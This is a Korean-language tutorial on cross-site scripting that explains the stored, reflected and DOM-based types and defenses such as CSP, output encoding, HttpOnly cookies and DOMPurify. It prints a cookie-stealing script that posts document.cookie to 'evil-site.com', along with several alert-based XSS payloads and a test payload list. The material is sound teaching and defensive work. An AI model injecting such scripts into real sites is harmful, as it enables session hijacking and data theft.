# 프런트엔드 보안: XSS 공격 이해와 방어 전략

## 1. XSS란 무엇인가?

크로스 사이트 스크립팅(Cross-Site Scripting, XSS)은 웹 애플리케이션에서 가장 흔한 보안 취약점 중 하나입니다. 공격자가 웹 페이지에 악성 클라이언트 측 스크립트를 삽입하여 다른 사용자의 브라우저에서 실행되도록 하는 공격 기법입니다. 이 공격이 성공하면 공격자는 사용자의 세션을 탈취하거나, 웹사이트를 변조하거나, 사용자를 악성 사이트로 리다이렉션할 수 있습니다.

## 2. XSS 공격의 유형

### 2.1 저장형 XSS (Stored XSS)

저장형 XSS는 가장 위험한 형태의 XSS 공격입니다. 이 공격은 다음과 같이 작동합니다:

1. 공격자가 악성 스크립트를 웹 애플리케이션의 데이터베이스에 저장합니다 (예: 댓글, 사용자 프로필, 메시지 등).
2. 희생자가 해당 데이터가 표시되는 페이지를 방문할 때마다 악성 스크립트가 실행됩니다.
3. 이 공격은 지속적이며 많은 사용자에게 영향을 미칠 수 있습니다.

**예시:**

```html
<script>
  fetch("https://evil-site.com/steal", {
    method: "POST",
    body: JSON.stringify({ cookies: document.cookie }),
  });
</script>
```

### 2.2 반사형 XSS (Reflected XSS)

반사형 XSS는 다음과 같이 작동합니다:

1. 공격자가 악성 스크립트가 포함된 링크를 희생자에게 보냅니다.
2. 희생자가 링크를 클릭하면 요청이 서버로 전송됩니다.
3. 서버는 악성 스크립트를 응답에 "반사"하고, 이는 희생자의 브라우저에서 실행됩니다.

**예시:**

```
https://example.com/search?q=<script>alert(document.cookie)</script>
```

### 2.3 DOM 기반 XSS (DOM-based XSS)

DOM 기반 XSS는 클라이언트 측에서만 발생하며, 서버와의 통신 없이 발생합니다:

1. 취약한 JavaScript 코드가 URL 해시나 로컬 스토리지와 같은 불신뢰 소스에서 데이터를 가져와 DOM을 조작합니다.
2. 공격자가 이 취약점을 이용하여 악성 페이로드를 주입합니다.

**예시:**

```javascript
// 취약한 코드
document.getElementById("output").innerHTML = location.hash.substring(1);

// 공격 URL
// https://example.com/page.html#<img src=x onerror=alert(1)>
```

## 3. XSS 공격의 영향

XSS 공격이 성공하면 다음과 같은 심각한 결과를 초래할 수 있습니다:

- **세션 하이재킹**: 사용자의 쿠키와 인증 토큰을 훔쳐 계정에 무단 접근
- **자격 증명 도용**: 가짜 로그인 양식을 통해 사용자 이름과 비밀번호 탈취
- **웹사이트 변조**: 웹사이트의 콘텐츠나 동작 수정
- **악성 리다이렉션**: 사용자를 피싱 사이트로 리다이렉션
- **키로깅**: 사용자의 키 입력을 기록하여 민감한 정보 수집
- **웹캠이나 마이크 액세스**: 사용자의 기기에서 미디어 장치에 액세스

## 4. 프런트엔드에서 XSS 방어 전략

### 4.1 입력 검증 및 출력 인코딩

**입력 검증 (클라이언트 측):**

```javascript
// 정규식을 이용한 입력 검증
function validateInput(input) {
  const safePattern = /^[a-zA-Z0-9\s]+$/;
  return safePattern.test(input);
}

// 사용 예
if (!validateInput(userInput)) {
  // 오류 메시지 표시 및 처리
}
```

**출력 인코딩:**

```javascript
// 일반 텍스트로 삽입 (안전)
document.getElementById("output").textContent = userInput;

// HTML로 삽입 (위험)
document.getElementById("output").innerHTML = userInput; // 이것은 피해야 함!
```

### 4.2 컨텐츠 보안 정책 (CSP)

CSP는 XSS 공격을 막는 강력한 두 번째 방어선입니다:

```html
<!-- HTML 메타 태그로 설정 -->
<meta
  http-equiv="Content-Security-Policy"
  content="default-src 'self'; script-src 'self' https://trusted-cdn.com"
/>

<!-- 또는 HTTP 헤더로 설정 (권장) -->
Content-Security-Policy: default-src 'self'; script-src 'self'
https://trusted-cdn.com
```

주요 CSP 지시문:

- `default-src`: 모든 리소스의 기본 정책
- `script-src`: JavaScript 소스 제한
- `style-src`: CSS 소스 제한
- `img-src`: 이미지 소스 제한
- `connect-src`: AJAX, WebSocket 연결 제한
- `frame-src`: iframe 소스 제한

### 4.3 프레임워크 및 라이브러리의 보안 기능 활용

**React:**

```jsx
// 안전하게 HTML 렌더링
<div>{userContent}</div> // React는 기본적으로 이스케이프 처리함

// 위험 - dangerouslySetInnerHTML 사용
<div dangerouslySetInnerHTML={{ __html: userContent }} /> // 꼭 필요할 때만 사용
```

### 4.4 쿠키 보안 강화

XSS 공격으로부터 쿠키를 보호하기 위한 설정:

```javascript
// 서버 측에서 쿠키 설정 (예: Express.js)
res.cookie("sessionId", "abc123", {
  httpOnly: true, // JavaScript에서 쿠키에 접근 불가
  secure: true, // HTTPS 연결에서만 전송
  sameSite: "strict", // CSRF 공격 방지에도 도움됨
});
```

### 4.5 사용자 입력 관리 라이브러리 활용

DOMPurify와 같은 라이브러리를 사용하여 HTML을 안전하게 처리:

```javascript
// DOMPurify 사용 예
import DOMPurify from "dompurify";

// 사용자 입력 정화 후 사용
const cleanHTML = DOMPurify.sanitize(userInput, {
  ALLOWED_TAGS: ["b", "i", "em", "strong", "a"],
  ALLOWED_ATTR: ["href"],
});
document.getElementById("output").innerHTML = cleanHTML;
```

## 5. XSS 방어를 위한 모범 사례 체크리스트

- [ ] 모든 사용자 입력을 신뢰하지 말고 검증하기
- [ ] 무조건 필요한 경우가 아니라면 `innerHTML`, `outerHTML`, `document.write()` 사용 피하기
- [ ] 컨텐츠 보안 정책(CSP) 구현하기
- [ ] 쿠키에 HttpOnly, Secure, SameSite 플래그 사용하기
- [ ] 프레임워크의 기본 보안 기능 활용하기
- [ ] HTML 정화(sanitization) 라이브러리 사용하기
- [ ] 정기적인 보안 검사 및 취약점 스캔 수행하기
- [ ] XSS 공격 대응 계획 수립하기

## 6. 테스트 및 취약점 찾기

### 6.1 개발 단계 테스트

```javascript
// 테스트 페이로드
const testPayloads = [
  "<script>alert(1)</script>",
  '"><script>alert(1)</script>',
  '<img src="x" onerror="alert(1)">',
  '<svg onload="alert(1)">',
  "javascript:alert(1)",
];

// 각 입력 필드와 출력 위치에서 이러한 페이로드를 테스트
```

### 6.2 자동화된 도구

- OWASP ZAP
- Burp Suite
- Acunetix
- Netsparker

## 7. 결론

XSS 공격은 여전히 웹 애플리케이션의 주요 보안 위협 중 하나입니다. 프런트엔드 개발자는 입력 검증, 출력 인코딩, CSP 구현, 프레임워크의 보안 기능 활용 등의
방법을 통해 XSS 공격으로부터 사용자를 보호할 책임이 있습니다. 보안은 개발 프로세스의 모든 단계에서 고려되어야 하며, 정기적인 보안 교육과 테스트가 중요합니다.

---
